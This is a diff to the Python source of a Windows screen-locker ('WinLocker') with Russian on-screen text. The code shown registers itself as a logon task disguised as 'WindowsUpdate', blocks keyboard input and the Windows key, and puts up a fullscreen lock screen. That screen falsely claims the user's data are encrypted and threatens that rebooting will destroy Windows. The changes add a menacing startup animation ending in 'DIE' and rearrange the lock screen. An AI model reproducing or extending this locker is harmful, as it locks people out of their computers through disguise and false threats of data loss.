@@ -1,4 +1,4 @@
-import ctypes, os, sys, time, threading, random, math, tkinter as tk
+import ctypes, os, sys, time, threading, random, tkinter as tk
 
 # === НАСТРОЙКИ ===
 PASSWORD = "1601"
@@ -30,6 +30,25 @@ def add_to_startup():
     command = f'python "{script_path}"'
     subprocess.run(f'schtasks /create /tn "WindowsUpdate" /tr "{command}" /sc onlogon /f', shell=True, capture_output=True)
 
+# === АНИМАЦИЯ ВКЛЮЧЕНИЯ ===
+def show_boot_animation():
+    root = tk.Tk()
+    root.attributes('-fullscreen', True)
+    root.configure(bg='black')
+    lbl = tk.Label(root, text="", fg='white', bg='black', font=('Courier', 36, 'bold'))
+    lbl.pack(expand=True)
+    messages = [
+        "ВАС ЗАМЕТИЛ МАРКУС...",
+        "ПОДКЛЮЧЕНИЕ К ctOS 2.0...",
+        "РАСШИФРОВКА КЛЮЧЕЙ...",
+        "DIE"
+    ]
+    for msg in messages:
+        lbl.config(text=msg)
+        root.update()
+        time.sleep(2)
+    root.destroy()
+
 # === ГЛАВНОЕ ОКНО БЛОКИРОВКИ ===
 class WinLocker:
     def __init__(self):
@@ -48,9 +67,8 @@ class WinLocker:
         # Центральные надписи
         self.canvas.create_text(400, 80, text="ВЫ УМРЁТЕ", fill='white', font=('Courier', 60, 'bold'), tags="title")
         self.canvas.create_text(400, 160, text="СИСТЕМА ЗАБЛОКИРОВАНА", fill='white', font=('Courier', 36))
-        self.canvas.create_text(400, 300, text="ВВЕДИТЕ ПАРОЛЬ:", fill='white', font=('Courier', 28))
         
-        # Дополнительный страшный текст
+        # Страшный текст слева
         scary_text = (
             "ВАШИ ДАННЫЕ ЗАШИФРОВАНЫ\n"
             "ПЕРЕЗАГРУЗКА ИЛИ ВЫКЛЮЧЕНИЕ ПК = СНОС WINDOWS\n"
@@ -66,31 +84,13 @@ class WinLocker:
             "4. Base64\nNDM1NjM0MjM0\n"
             "5. SHA1\nc93c407d0fb7c60a40b8a2f02b1e4ccf2a9c632d"
         )
-        self.canvas.create_text(400, 450, text=scary_text, fill='white', font=('Courier', 14))
+        self.canvas.create_text(50, 250, text=scary_text, fill='white', font=('Courier', 14), anchor='w')
         
-        # Поле ввода
+        # Поле ввода по центру
+        self.canvas.create_text(400, 300, text="ВВЕДИТЕ ПАРОЛЬ:", fill='white', font=('Courier', 28))
         self.entry = tk.Entry(self.win, show="*", font=('Courier', 28), bg='black', fg='white', insertbackground='white')
         self.canvas.create_window(400, 360, window=self.entry)
         self.status = self.canvas.create_text(400, 420, text="", fill='white', font=('Courier', 20))
-        
-        # Данные для летающих объектов
-        self.skulls = []
-        for _ in range(6):
-            self.skulls.append({
-                'x': random.randint(100, 700),
-                'y': random.randint(200, 500),
-                'dx': random.choice([-2, 2]),
-                'dy': random.choice([-2, 2])
-            })
-        
-        self.fucks = []
-        for _ in range(8):
-            self.fucks.append({
-                'x': random.randint(100, 700),
-                'y': random.randint(100, 500),
-                'dx': random.choice([-2, 2]),
-                'dy': random.choice([-2, 2])
-            })
         
         self.entry.bind('<Return>', self.check_password)
         self.entry.focus_set()
@@ -105,55 +105,12 @@ class WinLocker:
             self.canvas.itemconfig(self.status, text="НЕВЕРНЫЙ ПАРОЛЬ!")
             self.entry.delete(0, tk.END)
     
-    def draw_skull(self, x, y, laugh_frame):
-        """Рисует ASCII-череп, который смеётся"""
-        eye_h = 20 + (5 if laugh_frame % 10 < 5 else -5)
-        self.canvas.create_oval(x-40, y-30, x+40, y+30, outline='white', width=2)
-        self.canvas.create_oval(x-20, y-15, x-10, y-5, fill='white')
-        self.canvas.create_oval(x+10, y-15, x+20, y-5, fill='white')
-        self.canvas.create_polygon(x-10, y+5, x+10, y+5, x, y+15, fill='white')
-        if laugh_frame % 10 < 5:
-            self.canvas.create_arc(x-30, y+10, x+30, y+50, start=200, extent=140, style='arc', outline='white', width=2)
-        else:
-            self.canvas.create_rectangle(x-30, y+15, x+30, y+35, outline='white', width=2)
-    
-    def draw_fuck(self, x, y, frame):
-        """Рисует ASCII-надпись 'FUCK'"""
-        if frame % 20 < 10:
-            self.canvas.create_text(x, y, text="FUCK", fill='white', font=('Courier', 24, 'bold'))
-        else:
-            self.canvas.create_text(x, y, text="F*CK", fill='gray', font=('Courier', 24, 'bold'))
-    
     def animate(self):
-        self.canvas.delete("skull")
-        self.canvas.delete("fuck")
-        
-        # Обновляем и рисуем черепа
-        for skull in self.skulls:
-            skull['x'] += skull['dx']
-            skull['y'] += skull['dy']
-            if skull['x'] <= 40 or skull['x'] >= 760:
-                skull['dx'] *= -1
-            if skull['y'] <= 30 or skull['y'] >= 570:
-                skull['dy'] *= -1
-            self.draw_skull(skull['x'], skull['y'], int(time.time() * 10))
-        
-        # Обновляем и рисуем "факи"
-        for fuck in self.fucks:
-            fuck['x'] += fuck['dx']
-            fuck['y'] += fuck['dy']
-            if fuck['x'] <= 40 or fuck['x'] >= 760:
-                fuck['dx'] *= -1
-            if fuck['y'] <= 30 or fuck['y'] >= 570:
-                fuck['dy'] *= -1
-            self.draw_fuck(fuck['x'], fuck['y'], int(time.time() * 10))
-        
         # Мерцание главной надписи
         if random.random() < 0.1:
             self.canvas.itemconfig("title", fill='gray')
         else:
             self.canvas.itemconfig("title", fill='white')
-        
         self.win.after(50, self.animate)
 
 # === ЗАПУСК ===
@@ -163,5 +120,6 @@ if __name__ == "__main__":
     time.sleep(TIMER_SECONDS)
     block_input(True)
     threading.Thread(target=block_win_key, daemon=True).start()
+    show_boot_animation()
     app = WinLocker()
     app.root.mainloop()
